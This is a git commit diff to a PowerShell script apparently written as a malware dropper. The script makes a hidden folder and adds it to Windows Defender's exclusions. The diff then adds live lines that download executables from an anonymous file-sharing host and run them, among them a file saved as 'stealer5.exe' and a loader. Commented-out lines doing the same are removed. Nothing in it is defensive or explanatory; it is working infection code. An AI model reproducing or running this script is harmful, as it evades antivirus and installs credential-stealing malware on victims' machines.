51dc6ad0ebdaeaed66f43ad95953d681926584b8
43a1723 <hai1723notgay@gmail.com>
2025-04-02 18:20:38 +0700

    Update downloadfile.ps1

--- s/downloadfile.ps1
+++ s/downloadfile.ps1
@@ -5,23 +5,9 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 $folderPath = $dir
-# $filePath = "$folderPath\stealerv5.exe"
-# $url = "https://anonsharing.com/file/7e713a235817c63a/sigma_999.exe"
 
-# Tạo thư mục nếu chưa tồn tại
-# if (!(Test-Path $folderPath)) {
-#     New-Item -ItemType Directory -Path $folderPath -Force
-# }
 
-# Kiểm tra nếu file chưa tồn tại thì tải về
-# if (!(Test-Path $filePath)) {
-#     Invoke-WebRequest -Uri $url -OutFile $filePath
-# }
-
-# Chạy file thực thi
-# Start-Process -FilePath $filePath -NoNewWindow
-
-$filePath = "$folderPath\loader.exe"
+$filePath = "$folderPath\load4r.exe"
 $url = "https://anonsharing.com/file/34157158f6d1f6e2/skidloader.exe"
 
 # Tạo thư mục nếu chưa tồn tại
@@ -35,4 +21,14 @@ if (!(Test-Path $filePath)) {
 }
 
 # Chạy file thực thi
+Start-Process -FilePath $filePath -NoNewWindow
+
+$filePath = "$folderPath\stealer5.exe"
+$url = "https://anonsharing.com/file/7e713a235817c63a/sigma_999.exe"
+if (!(Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath -Force
+}
+if (!(Test-Path $filePath)) {
+    Invoke-WebRequest -Uri $url -OutFile $filePath
+}
 Start-Process -FilePath $filePath -NoNewWindow
